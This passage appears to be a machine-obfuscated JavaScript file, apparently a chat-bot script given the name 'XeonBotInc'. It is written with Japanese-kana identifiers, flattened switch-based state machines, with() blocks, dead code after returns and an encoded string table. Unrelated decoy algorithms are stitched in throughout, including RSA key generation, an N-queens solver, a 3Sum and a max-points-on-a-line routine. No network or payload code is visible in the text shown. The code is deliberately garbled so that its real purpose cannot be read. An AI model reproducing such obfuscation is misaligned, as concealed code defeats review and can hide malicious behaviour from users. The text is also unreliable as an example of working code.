                      return はつぬぬ.match(かゆめ + こぬあや);
                      まうはけひう.なへこ = まうはけひう.さなそしきも;
                      まうぬへ += 29;
                      めつにた += 201;
                      break;
                    case -128:
                    case 195:
                    case ほふはも - 253:
                      まうはけひう.なへこ = まうはけひう.ほすつつち;
                      まうぬへ += 486;
                      ほふはも += -302;
                      めつにた += 257;
                      break;
                    case -27:
                      [まうはけひう.よへうねよあ.よにとけ, まうはけひう.よへうねよあ.しめけた] = [-118, 111];
                      まうはけひう.なへこ = まうはけひう.よへうねよあ;
                      まうぬへ += -29;
                      ほふはも += -302;
                      めつにた += 378;
                      break;
                      if (ほふはも > ほふはも + 0) {
                        まうはけひう.なへこ = まうはけひう.よへうねよあ;
                        まうぬへ += -545;
                        ほふはも += 100;
                        めつにた += 351;
                        break;
                      }
                    case 71:
                    case -247:
                      [まうはけひう.よへうねよあ.よにとけ, まうはけひう.よへうねよあ.しめけた] = [-48, 84];
                      よへうねよあ.はつぬぬ = "(c=ak(<~F$VU'9f)~><&85dBPL-module/from";
                      よへうねよあ.かゆめ = "q:function(){var ad=ad=>b(ad-29);if(!T.r[(typeof ab==ad(123)" + すたきや[ほふはも + 157];
                      まうはけひう.なへこ = まうはけひう.よへうねよあ;
                      まうぬへ += 48;
                      ほふはも += -121;
                      めつにた += 340;
                      break;
                    case 178:
                    default:
                    case -121:
                      まうはけひう.なへこ = まうはけひう.もにとえす;
                      まうぬへ += 545;
                      ほふはも += -402;
                      めつにた += 228;
                      break;
                    case 117:
                      まうはけひう.なへこ = まうはけひう.めつつ;
                      まうぬへ += -282;
                      ほふはも += -213;
                      めつにた += 628;
                      break;
                  }
                }
              }
            };
            しむの.うとうとし = undefined;
            1;
            しむの.むかまそむさ = しむの.めこぬめせ(-(むほえ + 35), -(むほえ + 136), -(むほえ + 127)).next().value;
            if (しむの.うとうとし) {
              まうはけひう.はえや = まうはけひう.しむの;
              むほえ += 63;
              まうぬへ += 164;
              めつにた += -140;
              break;
            } else {
              まうはけひう.はえや = まうはけひう.しむの;
              むほえ += 164;
              まうぬへ += 164;
              ほふはも += -330;
              めつにた += -140;
              break;
            }
          case まうぬへ - 64:
            1;
            そてむ();
            まうはけひう.はえや = まうはけひう.みとほさ;
            むほえ += 134;
            ほふはも += -83;
            break;
          case むほえ - 252:
            ぬめくほき = true;
            return そしねめ(えたもそ, XeonBotInc);
            まうはけひう.はえや = まうはけひう.みとほさ;
            むほえ += 295;
            まうぬへ += 12;
            ほふはも += -475;
            めつにた += 468;
            break;
            if (!(めつにた < -(むほえ + 51))) {
              まうはけひう.はえや = まうはけひう.みとほさ;
              むほえ += -678;
              まうぬへ += -80;
              ほふはも += 369;
              めつにた += 445;
              break;
            }
          case まうはけひう.みとほさ.はにてけゆふ + 179:
            まうはけひう.みとほさ.えたもそ = くめうめみか[すたきや[ほふはも + -142] + すたきや[まうぬへ + -101]]()[すたきや[ほふはも + 313] + すたきや[まうぬへ + -78]](めはぬこ, "");
            if (!("Vk_HFI" + すたきや[ほふはも + -85] in うぬせ)) {
              まうはけひう.はえや = まうはけひう.みとほさ;
              むほえ += 164;
              まうぬへ += 62;
              ほふはも += -330;
              めつにた += -110;
              break;
            } else {
              まうはけひう.はえや = まうはけひう.みとほさ;
              むほえ += 212;
              まうぬへ += 62;
              ほふはも += -805;
              めつにた += 358;
              break;
            }
          case めつにた + 83:
            まうはけひう.はえや = まうはけひう.しむの;
            むほえ += 70;
            まうぬへ += -450;
            ほふはも += 460;
            めつにた += -121;
            break;
          case 237:
          case 216:
          case まうはけひう.みとほさ.はにてけゆふ + 21:
            まうはけひう.はえや = まうはけひう.みとほさ;
            むほえ += 514;
            まうぬへ += 18;
            ほふはも += -39;
            めつにた += -335;
            break;
          case -47:
          case -148:
          case まうはけひう.みとほさ.はにてけゆふ + -117:
            まうはけひう.はえや = まうはけひう.みとほさ;
            むほえ += 678;
            まうぬへ += 218;
            ほふはも += -369;
            めつにた += -445;
            break;
          case めつにた + 304:
            まうはけひう.はえや = まうはけひう.みとほさ;
            むほえ += 726;
            まうぬへ += -450;
            ほふはも += -844;
            めつにた += 266;
            break;
        }
      }
    }
  }
  var ぬめくほき;
  var むほえ = ちせそ(-90, -8, -231, 127).next().value;
  if (ぬめくほき) {
    return むほえ;
  }
}
function むほえ() {
  if ("B2pn6h" in すかく) {
    くめうめみか();
  }
  function くめうめみか() {}
  function うぬせ(くめうめみか, うぬせ) {
    function* XeonBotInc(ちせそ, そしねめ, ぬめくほき = {
      えたとてふ: {}
    }, むほえ) {
      while (ちせそ + そしねめ !== 32) {
        with (ぬめくほき.やくねとあふ || ぬめくほき) {
          switch (ちせそ + そしねめ) {
            case ちせそ + 226:
              ぬめくほき.えたとてふ.いしすゆい = くめうめみか.length;
              ぬめくほき.えたとてふ.かほとけふ = うぬせ.length;
              ぬめくほき.えたとてふ.きめくむ = すたきや[ちせそ + 113];
              if (かほとけふ > いしすゆい) {
                ぬめくほき.やくねとあふ = ぬめくほき.えたとてふ;
                ちせそ += 477;
                そしねめ += -362;
                break;
              } else {
                ぬめくほき.やくねとあふ = ぬめくほき.えたとてふ;
                ちせそ += 120;
                そしねめ += -4;
                break;
              }
            case -11:
            case ちせそ + 5:
            case 203:
              ふかそにとへ.めふすぬと = function (ちせそ) {
                function* そしねめ(そしねめ, むほえ, まうぬへ, ほふはも = {
                  によきゆく: {}
                }) {
                  while (そしねめ + むほえ + まうぬへ !== -98) {
                    with (ほふはも.やむてきそ || ほふはも) {
                      switch (そしねめ + むほえ + まうぬへ) {
                        default:
                        case 94:
                          ほふはも.によきゆく.ひさけ = Math.max(...ちせそ);
                          ほふはも.によきゆく.うあみ = Math.min(...ちせそ);
                          ほふはも.やむてきそ = ほふはも.によきゆく;
                          そしねめ += -142;
                          むほえ += -258;
                          break;
                          if (!(むほえ != そしねめ + -1)) {
                            ほふはも.やむてきそ = ほふはも.によきゆく;
                            そしねめ += -84;
                            むほえ += -203;
                            まうぬへ += 291;
                            break;
                          }
                        case 87:
                        case そしねめ - 218:
                          ほふはも.やむてきそ = ほふはも.によきゆく;
                          そしねめ += 256;
                          むほえ += 46;
                          まうぬへ += -65;
                          break;
                        case むほえ + 266:
                          [ほふはも.によきゆく.とのぬさむ, ほふはも.によきゆく.ほてふこ] = [-190, -136];
                          ほふはも.やむてきそ = ほふはも.によきゆく;
                          そしねめ += 205;
                          むほえ += -106;
                          まうぬへ += -314;
                          break;
                          if (そしねめ < むほえ + 83) {
                            ほふはも.やむてきそ = ほふはも.によきゆく;
                            そしねめ += -180;
                            むほえ += -55;
                            まうぬへ += -124;
                            break;
                          }
                        case むほえ + 157:
                        case -195:
                        case -186:
                          ほふはも.によきゆく.うぬとふみ = Number.MIN_SAFE_INTEGER;
                          ほふはも.によきゆく.もえくあちも = うあみ;
                          for (ほふはも.によきゆく.みむぬまひ = すたきや[0]; みむぬまひ < みはめねはゆ - すたきや[むほえ + 145]; みむぬまひ++) {
                            if (せなとくよお[みむぬまひ] === Number.MAX_SAFE_INTEGER && ほもに[みむぬまひ] === Number.MIN_SAFE_INTEGER) {
                              continue;
                            }
                            うぬとふみ = Math.max(うぬとふみ, せなとくよお[みむぬまひ] - もえくあちも);
                            もえくあちも = ほもに[みむぬまひ];
                          }
                          うぬとふみ = Math.max(うぬとふみ, ひさけ - もえくあちも);
                          ぬめくほき = true;
                          return うぬとふみ;
                          ほふはも.やむてきそ = ほふはも.へいす;
                          そしねめ += -205;
                          むほえ += 94;
                          break;
                          if (!(まうぬへ == -93)) {
                            ほふはも.やむてきそ = ほふはも.ねいめはこみ;
                            そしねめ += -205;
                            むほえ += 94;
                            break;
                          }
                        case ほふはも.によきゆく.とのぬさむ + -97:
                          ほふはも.やむてきそ = ほふはも.きともこ;
                          そしねめ += 429;
                          むほえ += -279;
                          まうぬへ += -288;
                          break;
                        case 219:
                        case そしねめ - 163:
                          if (ひさけ === うあみ) {
                            ぬめくほき = true;
                            return すたきや[むほえ + 93];
                          }
                          ほふはも.によきゆく.せなとくよお = Array(みはめねはゆ - すたきや[1]).fill(Number.MAX_SAFE_INTEGER);
                          ほふはも.やむてきそ = ほふはも.によきゆく;
                          そしねめ += -122;
                          まうぬへ += 167;
                          break;
                        case -131:
                        case -41:
                        case -91:
                          ほふはも.によきゆく.ほもに = Array(みはめねはゆ - すたきや[そしねめ + 136]).fill(Number.MIN_SAFE_INTEGER);
                          ほふはも.によきゆく.ちくもあ = Math.ceil((ひさけ - うあみ) / (みはめねはゆ - すたきや[そしねめ + 136]));
                          ほふはも.やむてきそ = ほふはも.によきゆく;
                          むほえ += -75;
                          break;
                        case まうぬへ - 82:
                          [ほふはも.によきゆく.とのぬさむ, ほふはも.によきゆく.ほてふこ] = [137, 33];
                          によきゆく.みはめねはゆ = ちせそ.length;
                          if (によきゆく.みはめねはゆ < すたきや[むほえ + 111]) {
                            ぬめくほき = true;
                            return すたきや[0];
                          }
                          ほふはも.やむてきそ = ほふはも.によきゆく;
                          そしねめ += 112;
                          むほえ += 264;
                          まうぬへ += -86;
                          break;
                        case そしねめ - 71:
                          ほふはも.によきゆく.いちこおみ = すたきや[むほえ + 168];
                          for (ほふはも.によきゆく.ねはひお = すたきや[そしねめ + 135]; ねはひお < みはめねはゆ; ねはひお++) {
                            if (ちせそ[ねはひお] === うあみ || ちせそ[ねはひお] === ひさけ) {
                              continue;
                            }
                            いちこおみ = Math.floor((ちせそ[ねはひお] - うあみ) / ちくもあ);
                            せなとくよお[いちこおみ] = Math.min(せなとくよお[いちこおみ], ちせそ[ねはひお]);
                            ほもに[いちこおみ] = Math.max(ほもに[いちこおみ], ちせそ[ねはひお]);
                          }
                          ほふはも.やむてきそ = ほふはも.によきゆく;
                          そしねめ += 385;
                          むほえ += 24;
                          まうぬへ += -190;
                          break;
                      }
                    }
                  }
                }
                var ぬめくほき;
                var むほえ = そしねめ(17, -99, 16).next().value;
                if (ぬめくほき) {
                  return むほえ;
                }
              };
              console.log(ふかそにとへ.めふすぬと);
              ぬめくほき.やくねとあふ = ぬめくほき.ふかそにとへ;
              ちせそ += -148;
              そしねめ += -26;
              break;
              if (そしねめ > ちせそ + 3) {
                ぬめくほき.やくねとあふ = ぬめくほき.ふかそにとへ;
                ちせそ += -148;
                そしねめ += -26;
                break;
              }
            case ちせそ - 429:
              1;
              あほくよま();
              ぬめくほき.やくねとあふ = ぬめくほき.えたとてふ;
              ちせそ += -349;
              そしねめ += 655;
              break;
              if (!(ちせそ == 236)) {
                ぬめくほき.やくねとあふ = ぬめくほき.えたとてふ;
                ちせそ += -349;
                そしねめ += 655;
                break;
              }
            case -187:
              [ぬめくほき.えたとてふ.かせよはえす] = [23];
              えたとてふ.あほくよま = function (...ちせそ) {
                return XeonBotInc(-191, 87, {
                  えたとてふ: ぬめくほき.えたとてふ,
                  まかよ: {}
                }, ちせそ).next().value;
              };
              if ("m263Q9" + すたきや[101] in すかく) {
                ぬめくほき.やくねとあふ = ぬめくほき.えたとてふ;
                ちせそ += 542;
                そしねめ += -548;
                break;
              } else {
                ぬめくほき.やくねとあふ = ぬめくほき.えたとてふ;
                ちせそ += 193;
                そしねめ += 107;
                break;
              }
            default:
              for (let まうぬへ = すたきや[0]; まうぬへ <= いしすゆい - かほとけふ; まうぬへ++) {
                if ("DmkHNB" in すかく) {
                  ほふはも();
                }
                function ほふはも() {}
                for (let めつにた = すたきや[0]; めつにた < かほとけふ; めつにた++) {
                  if ("r9cYOvV" in すかく) {
                    まうはけひう();
                  }
                  function まうはけひう() {
                    var ちせそ = function (ちせそ) {
                      var ぬめくほき = [];
                      if (ちせそ === すたきや[1] || ちせそ >= すたきや[9]) {
                        そしねめ(ぬめくほき, [], ちせそ, すたきや[0]);
                      }
                      return ぬめくほき;
                    };
                    var そしねめ = function (ちせそ, ほふはも, まうはけひう, へあは) {
                      for (var ててむすね = へあは; ててむすね < まうはけひう; ててむすね++) {
                        if (ほふはも.length !== ててむすね) {
                          return;
                        }
                        for (var うよむに = すたきや[0]; うよむに < まうはけひう; うよむに++) {
                          if (むほえ(ほふはも, [ててむすね, うよむに])) {
                            ほふはも.push([ててむすね, うよむに]);
                            そしねめ(ちせそ, ほふはも, まうはけひう, ててむすね + すたきや[1]);
                            if (ほふはも.length === まうはけひう) {
                              ちせそ.push(ぬめくほき(ほふはも));
                            }
                            ほふはも.pop();
                          }
                        }
                      }
                    };
                    var ぬめくほき = function (ちせそ) {
                      var そしねめ = [];
                      var ぬめくほき = ちせそ.length;
                      for (var むほえ = すたきや[0]; むほえ < ぬめくほき; むほえ++) {
                        そしねめ[むほえ] = "";
                        for (var ほふはも = すたきや[0]; ほふはも < ぬめくほき; ほふはも++) {
                          そしねめ[むほえ] += ちせそ[むほえ][すたきや[1]] === ほふはも ? すたきや[10] : すたきや[11];
                        }
                      }
                      return そしねめ;
                    };
                    var むほえ = function (ちせそ, そしねめ) {
                      var ぬめくほき = ちせそ.length;
                      for (var むほえ = すたきや[0]; むほえ < ぬめくほき; むほえ++) {
                        if (ちせそ[むほえ][すたきや[0]] === そしねめ[すたきや[0]] || ちせそ[むほえ][すたきや[1]] === そしねめ[すたきや[1]]) {
                          return すたきや[2];
                        }
                        if (Math.abs((ちせそ[むほえ][すたきや[0]] - そしねめ[すたきや[0]]) / (ちせそ[むほえ][すたきや[1]] - そしねめ[すたきや[1]])) === すたきや[1]) {
                          return すたきや[2];
                        }
                      }
                      return すたきや[4];
                    };
                    console.log(ちせそ);
                  }
                  if (くめうめみか[まうぬへ + めつにた] === うぬせ[めつにた]) {
                    if ("hJerw7" + すたきや[ちせそ + 92] in すかく) {
                      へあは();
                    }
                    function へあは() {
                      const ちせそ = require("big-integer");
                      class そしねめ {
                        static randomPrime(そしねめ) {
                          const ぬめくほき = ちせそ.one.shiftLeft(そしねめ - すたきや[1]);
                          const むほえ = ちせそ.one.shiftLeft(そしねめ).prev();
                          while (すたきや[4]) {
                            let まうぬへ = ちせそ.randBetween(ぬめくほき, むほえ);
                            if (まうぬへ.isProbablePrime(すたきや[15])) {
                              return まうぬへ;
                            }
                          }
                        }
                        static generate(そしねめ) {
                          const ぬめくほき = ちせそ(すたきや[16]);
                          let むほえ;
                          let まうぬへ;
                          let ほふはも;
                          do {
                            むほえ = this.randomPrime(そしねめ / すたきや[12]);
                            まうぬへ = this.randomPrime(そしねめ / すたきや[12]);
                            ほふはも = ちせそ.lcm(むほえ.prev(), まうぬへ.prev());
                          } while (ちせそ.gcd(ぬめくほき, ほふはも).notEquals(すたきや[1]) || むほえ.minus(まうぬへ).abs().shiftRight(そしねめ / すたきや[12] - すたきや[17]).isZero());
                          return {
                            e: ぬめくほき,
                            n: むほえ.multiply(まうぬへ),
                            d: ぬめくほき.modInv(ほふはも)
                          };
                        }
                        static encrypt(そしねめ, ぬめくほき, むほえ) {
                          return ちせそ(そしねめ).modPow(むほえ, ぬめくほき);
                        }
                        static decrypt(そしねめ, ぬめくほき, むほえ) {
                          return ちせそ(そしねめ).modPow(ぬめくほき, むほえ);
                        }
                        static encode(そしねめ) {
                          const ぬめくほき = そしねめ.split("").map(そしねめ => そしねめ.charCodeAt()).join("");
                          return ちせそ(ぬめくほき);
                        }
                        static decode(ちせそ) {
                          const そしねめ = ちせそ.toString();
                          let ぬめくほき = "";
                          for (let むほえ = すたきや[0]; むほえ < そしねめ.length; むほえ += すたきや[12]) {
                            let ほふはも = Number(そしねめ.substr(むほえ, すたきや[12]));
                            if (ほふはも <= すたきや[18]) {
                              ぬめくほき += String.fromCharCode(Number(そしねめ.substr(むほえ, すたきや[19])));
                              むほえ++;
                            } else {
                              ぬめくほき += String.fromCharCode(ほふはも);
                            }
                          }
                          return ぬめくほき;
                        }
                      }
                      module.exports = そしねめ;
                    }
                    きめくむ++;
                    if (きめくむ === かほとけふ) {
                      if ("Gz5f5h" in すかく) {
                        ててむすね();
                      }
                      function ててむすね() {}
                      めはぬこ = true;
                      return まうぬへ;
                    }
                  } else {
                    if ("NBCdUD" + すたきや[249] in すかく) {
                      うよむに();
                    }
                    function うよむに() {
                      module.exports = async (ちせそ = () => {
                        throw new Error("No redacted path p" + すたきや[13] + すたきや[209]);
                      }) => {
                        const そしねめ = new Set(process.argv.slice(すたきや[12]));
                        if (!そしねめ.has("--vers" + すたきや[341])) {
                          if (そしねめ.size !== すたきや[1]) {
                            return すたきや[2];
                          }
                          if (!そしねめ.has("-v")) {
                            return すたきや[2];
                          }
                        }
                        return すたきや[4];
                      };
                    }
                    きめくむ = すたきや[ちせそ + -7];
                    break;
                  }
                }
              }
              めはぬこ = true;
              return -すたきや[1];
              ぬめくほき.やくねとあふ = ぬめくほき.つせぬつつこ;
              ちせそ += -197;
              break;
            case 119:
            case ちせそ - 224:
              return undefined;
            case 70:
            case -235:
            case 5:
              ぬめくほき.やくねとあふ = ぬめくほき.けもさか;
              ちせそ += -13;
              そしねめ += 280;
              break;
              if (そしねめ < -(ちせそ + 235)) {
                ぬめくほき.やくねとあふ = ぬめくほき.えたとてふ;
                ちせそ += 168;
                break;
              }
            case 194:
            case -67:
              [ぬめくほき.えたとてふ.かせよはえす] = [88];
              ぬめくほき.やくねとあふ = ぬめくほき.けこさ;
              ちせそ += -182;
              そしねめ += 145;
              break;
            case ぬめくほき.えたとてふ.かせよはえす + -127:
              まかよ.さしね = function (ちせそ) {
                function* そしねめ(そしねめ, むほえ, まうぬへ, ほふはも, めつにた = {
                  つねと: {}
                }) {
                  while (そしねめ + むほえ + まうぬへ + ほふはも !== -87) {
                    with (めつにた.ぬこなき || めつにた) {
                      switch (そしねめ + むほえ + まうぬへ + ほふはも) {
                        case ほふはも != -74 && ほふはも - 92:
                        case -143:
                        case -121:
                          めつにた.つねと.ゆうなふみ = すたきや[そしねめ + 328];
                          めつにた.つねと.すきすへち = ちせそ.length;
                          めつにた.ぬこなき = めつにた.つねと;
                          むほえ += -160;
                          ほふはも += 43;
                          break;
                          if (ほふはも < そしねめ + 588) {
                            めつにた.ぬこなき = めつにた.けてくさもむ;
                            そしねめ += 577;
                            むほえ += -44;
                            まうぬへ += -853;
                            ほふはも += -55;
                            break;
                          }
                        case -166:
                        default:
                          めつにた.つねと.とつおしちか = すたきや[そしねめ + 328];
                          めつにた.つねと.おそおて = すたきや[むほえ + -31];
                          めつにた.ぬこなき = めつにた.つねと;
                          ほふはも += 334;
                          break;
                        case めつにた.つねと.のたえめや + 30:
                          [めつにた.つねと.のたえめや] = [-19];
                          めつにた.ぬこなき = めつにた.つねと;
                          そしねめ += -520;
                          まうぬへ += -105;
                          ほふはも += 507;
                          break;
                          if (むほえ == そしねめ + -18) {
                            めつにた.ぬこなき = めつにた.よのはそみお;
                            そしねめ += 57;
                            むほえ += 116;
                            まうぬへ += -958;
                            ほふはも += 409;
                            break;
                          }
                        case そしねめ - 12:
                        case 225:
                          めつにた.ぬこなき = めつにた.つねと;
                          そしねめ += -159;
                          まうぬへ += 314;
                          ほふはも += 77;
                          break;
                          if (むほえ == そしねめ + 343) {
                            めつにた.ぬこなき = めつにた.うひやいそも;
                            そしねめ += 418;
                            むほえ += 116;
                            まうぬへ += -539;
                            ほふはも += -21;
                            break;
                          }
                        case -153:
                        case 178:
                        case -207:
                          [めつにた.つねと.のたえめや] = [139];
                          つねと.ぬやせ = すたきや[そしねめ + -249];
                          つねと.てもほ = {};
                          めつにた.ぬこなき = めつにた.つねと;
                          そしねめ += -577;
                          むほえ += 44;
                          まうぬへ += 853;
                          ほふはも += -279;
                          break;
                        case 156:
                        case ほふはも - 252:
                          for (めつにた.つねと.まあよめめき = すたきや[そしねめ + 328]; まあよめめき < すきすへち; まあよめめき++) {
                            てもほ = {};
                            とつおしちか = すたきや[0];
                            おそおて = すたきや[1];
                            for (めつにた.つねと.おほふうせさ = まあよめめき + すたきや[まうぬへ + -(まうぬへ + -1)]; おほふうせさ < すきすへち; おほふうせさ++) {
                              if (ちせそ[まあよめめき].x === ちせそ[おほふうせさ].x && ちせそ[まあよめめき].y === ちせそ[おほふうせさ].y) {
                                おそおて++;
                                continue;
                              }
                              if (ちせそ[まあよめめき].y === ちせそ[おほふうせさ].y) {
                                ゆうなふみ = Number.MAX_SAFE_INTEGER;
                              } else {
                                ゆうなふみ = (ちせそ[まあよめめき].x - ちせそ[おほふうせさ].x) / (ちせそ[まあよめめき].y - ちせそ[おほふうせさ].y);
                              }
                              if (!てもほ[ゆうなふみ]) {
                                てもほ[ゆうなふみ] = すたきや[0];
                              }
                              てもほ[ゆうなふみ]++;
                              とつおしちか = Math.max(とつおしちか, てもほ[ゆうなふみ]);
                            }
                            とつおしちか += おそおて;
                            ぬやせ = Math.max(ぬやせ, とつおしちか);
                          }
                          ぬめくほき = true;
                          return ぬやせ;
                          めつにた.ぬこなき = めつにた.とくま;
                          まうぬへ += 105;
                          ほふはも += -243;
                          break;
                      }
                    }
                  }
                }
                var ぬめくほき;
                var むほえ = そしねめ(249, -13, -648, 205).next().value;
                if (ぬめくほき) {
                  return むほえ;
                }
              };
              console.log(まかよ.さしね);
              ぬめくほき.やくねとあふ = ぬめくほき.まかよ;
              ちせそ += 177;
              そしねめ += -223;
              break;
            case そしねめ + 193:
              return undefined;
            case -70:
            case -119:
            case -183:
              1;
              すなす();
              ぬめくほき.やくねとあふ = ぬめくほき.えたとてふ;
              ちせそ += -388;
              そしねめ += 693;
              break;
            case -150:
              return undefined;
            case 122:
              めはぬこ = true;
              return -すたきや[ちせそ + 25];
              ぬめくほき.やくねとあふ = ぬめくほき.えたとてふ;
              ちせそ += 31;
              そしねめ += 76;
              break;
            case ぬめくほき.えたとてふ.かせよはえす + -37:
            case 156:
            case 150:
              return undefined;
              if (ちせそ != 7) {
                ぬめくほき.やくねとあふ = ぬめくほき.えたとてふ;
                ちせそ += -31;
                そしねめ += 167;
                break;
              }
            case 228:
              ぬめくほき.そうみかひ = {};
              ぬめくほき.そうみかひ.すなす = function (...ちせそ) {
                return XeonBotInc(155, 5, {
                  そうみかひ: ぬめくほき.そうみかひ,
                  えたとてふ: ぬめくほき.えたとてふ,
                  ふかそにとへ: {}
                }, ちせそ).next().value;
              };
              if ("Hb7gIb" in すかく) {
                ぬめくほき.やくねとあふ = ぬめくほき.そうみかひ;
                そしねめ += -411;
                break;
              } else {
                ぬめくほき.やくねとあふ = ぬめくほき.えたとてふ;
                ちせそ += -388;
                そしねめ += 282;
                break;
              }
            case 190:
            case 124:
            case そしねめ != -224 && そしねめ + 223:
              if (ちせそ > -(ちせそ + -33)) {
                ぬめくほき.やくねとあふ = ぬめくほき.もにう;
                ちせそ += -68;
                そしねめ += 251;
                break;
              }
            case ちせそ + 72:
              [ぬめくほき.えたとてふ.かせよはえす] = [4];
              ぬめくほき.やくねとあふ = ぬめくほき.にねよも;
              ちせそ += 164;
              そしねめ += -67;
              break;
          }
        }
      }
    }
    var めはぬこ;
    var ちせそ = XeonBotInc(-306, 119).next().value;
    if (めはぬこ) {
      return ちせそ;
    }
  }
  function XeonBotInc(くめうめみか) {
    function* XeonBotInc(ちせそ, そしねめ, ぬめくほき = {
      にこほちつめ: {}
    }, むほえ) {
      while (ちせそ + そしねめ !== 67) {
        with (ぬめくほき.やひこえすせ || ぬめくほき) {
          switch (ちせそ + そしねめ) {
            case ちせそ + 8:
              [ぬめくほき.にこほちつめ.へたなたはの] = [246];
              にこほちつめ.につすのこ = function (...ちせそ) {
                return XeonBotInc(37, 164, {
                  にこほちつめ: ぬめくほき.にこほちつめ,
                  ふはふやせ: {}
                }, ちせそ).next().value;
              };
              if ("LmTwbE" + すたきや[14] in すかく) {
                ぬめくほき.やひこえすせ = ぬめくほき.にこほちつめ;
                ちせそ += -235;
                そしねめ += 9;
                break;
              } else {
                ぬめくほき.やひこえすせ = ぬめくほき.にこほちつめ;
                ちせそ += -383;
                そしねめ += 9;
                break;
              }
            case -209:
            case -219:
              return undefined;
            case ちせそ != -159 && ちせそ + 112:
              めはぬこ = true;
              return くめうめみか;
              ぬめくほき.やひこえすせ = ぬめくほき.あしみくなた;
              ちせそ += 418;
              そしねめ += -163;
              break;
            case そしねめ != 118 && そしねめ != 272 && そしねめ != -41 && そしねめ != -60 && そしねめ - 159:
              ほしさな.ほぬの = function (ちせそ) {
                function* そしねめ(そしねめ, むほえ, ほふはも = {
                  すちむ: {}
                }) {
                  while (そしねめ + むほえ !== 187) {
                    with (ほふはも.むなうほ || ほふはも) {
                      switch (そしねめ + むほえ) {
                        case -188:
                          [ほふはも.すちむ.てとたいひも] = [115];
                          すちむ.こきそとか = ちせそ.length;
                          すちむ.もほてえ = [];
                          すちむ.かてこも = すたきや[そしねめ + 100];
                          すちむ.ゆうきか = すたきや[そしねめ + 100];
                          ほふはも.むなうほ = ほふはも.すちむ;
                          そしねめ += 42;
                          むほえ += 5;
                          break;
                        case -195:
                        case 123:
                        case そしねめ - 83:
                          ちせそ.sort((そしねめ, むほえ) => そしねめ - むほえ);
                          for (ほふはも.すちむ.なやせひ = すたきや[0]; なやせひ < こきそとか; なやせひ++) {
                            if (なやせひ > すたきや[そしねめ + 58] && ちせそ[なやせひ] === ちせそ[なやせひ - すたきや[1]]) {
                              continue;
                            }
                            かてこも = なやせひ + すたきや[1];
                            ゆうきか = こきそとか - すたきや[1];
                            while (かてこも < ゆうきか) {
                              if (ちせそ[なやせひ] + ちせそ[かてこも] + ちせそ[ゆうきか] < すたきや[0]) {
                                かてこも++;
                              } else if (ちせそ[なやせひ] + ちせそ[かてこも] + ちせそ[ゆうきか] > すたきや[0]) {
                                ゆうきか--;
                              } else {
                                もほてえ.push([ちせそ[なやせひ], ちせそ[かてこも], ちせそ[ゆうきか]]);
                                while (かてこも < ゆうきか && ちせそ[かてこも] === ちせそ[かてこも + すたきや[1]]) {
                                  かてこも++;
                                }
                                while (かてこも < ゆうきか && ちせそ[ゆうきか] === ちせそ[ゆうきか - すたきや[1]]) {
                                  ゆうきか--;
                                }
                                かてこも++;
                                ゆうきか--;
                              }
                            }
                          }
                          ほふはも.むなうほ = ほふはも.すちむ;
                          むほえ += 150;
                          break;
                        case むほえ - 40:
                        case 11:
                        case -91:
                          [ほふはも.すちむ.てとたいひも] = [-89];
                          ほふはも.むなうほ = ほふはも.すちむ;
                          そしねめ += -18;
                          むほえ += -156;
                          break;
                        case むほえ != -83 && むほえ - 58:
                          ぬめくほき = true;
                          return もほてえ;
                          ほふはも.むなうほ = ほふはも.とねひえつ;
                          そしねめ += 118;
                          むほえ += 60;
                          break;
                        case -140:
                          [ほふはも.すちむ.てとたいひも] = [-88];
                          ほふはも.むなうほ = ほふはも.すちむ;
                          そしねめ += 156;
                          むほえ += -157;
                          break;
                        default:
                          ほふはも.むなうほ = ほふはも.すちむ;
                          そしねめ += 40;
                          むほえ += -106;
                          break;
                        case ほふはも.すちむ.てとたいひも + -224:
                        case 114:
                        case -135:
                          ほふはも.むなうほ = ほふはも.すちむ;
                          そしねめ += -190;
                          むほえ += 158;
                          break;
                      }
                    }
                  }
                }
                var ぬめくほき;
                var むほえ = そしねめ(-100, -88).next().value;
                if (ぬめくほき) {
                  return むほえ;
                }
              };
              console.log(ほしさな.ほぬの);
              return undefined;
            case そしねめ + 37:
              ふはふやせ.あそぬぬに = function* ちせそ(そしねめ, ぬめくほき, むほえ, ほふはも = {
                もせおもくこ: {}
              }) {
                while (そしねめ + ぬめくほき + むほえ !== -200) {
                  with (ほふはも.のおそて || ほふはも) {
                    switch (そしねめ + ぬめくほき + むほえ) {
                      case -26:
                      case ほふはも.もせおもくこ.うよひちやあ + 406:
                        ほふはも.のおそて = ほふはも.さゆやははむ;
                        そしねめ += -7;
                        ぬめくほき += 463;
                        むほえ += -474;
                        break;
                      case 107:
                      case ぬめくほき - 265:
                        [ほふはも.もせおもくこ.うよひちやあ] = [-203];
                        もせおもくこ.うはあ = require("big-integer");
                        もせおもくこ.いゆとよ = class くめうめみか {
                          static randomPrime(ちせそ) {
                            const そしねめ = もせおもくこ.うはあ.one.shiftLeft(ちせそ - すたきや[1]);
                            const ぬめくほき = もせおもくこ.うはあ.one.shiftLeft(ちせそ).prev();
                            while (すたきや[4]) {
                              let むほえ = もせおもくこ.うはあ.randBetween(そしねめ, ぬめくほき);
                              if (むほえ.isProbablePrime(すたきや[15])) {
                                return むほえ;
                              }
                            }
                          }
                          static generate(ちせそ) {
                            1;
                            const そしねめ = もせおもくこ.うはあ(すたきや[16]);
                            let ぬめくほき;
                            let むほえ;
                            let ほふはも;
                            do {
                              ぬめくほき = this.randomPrime(ちせそ / すたきや[12]);
                              むほえ = this.randomPrime(ちせそ / すたきや[12]);
                              ほふはも = もせおもくこ.うはあ.lcm(ぬめくほき.prev(), むほえ.prev());
                            } while (もせおもくこ.うはあ.gcd(そしねめ, ほふはも).notEquals(すたきや[1]) || ぬめくほき.minus(むほえ).abs().shiftRight(ちせそ / すたきや[12] - すたきや[17]).isZero());
                            return {
                              e: そしねめ,
                              n: ぬめくほき.multiply(むほえ),
                              d: そしねめ.modInv(ほふはも)
                            };
                          }
                          static encrypt(ちせそ, そしねめ, ぬめくほき) {
                            1;
                            return もせおもくこ.うはあ(ちせそ).modPow(ぬめくほき, そしねめ);
                          }
                          static decrypt(ちせそ, そしねめ, ぬめくほき) {
                            1;
                            return もせおもくこ.うはあ(ちせそ).modPow(そしねめ, ぬめくほき);
                          }
                          static encode(ちせそ) {
                            const そしねめ = ちせそ.split("").map(ちせそ => ちせそ.charCodeAt()).join("");
                            1;
                            return もせおもくこ.うはあ(そしねめ);
                          }
                          static decode(ちせそ) {
                            const そしねめ = ちせそ.toString();
                            let ぬめくほき = "";
                            for (let むほえ = すたきや[0]; むほえ < そしねめ.length; むほえ += すたきや[12]) {
                              let ほふはも = Number(そしねめ.substr(むほえ, すたきや[12]));
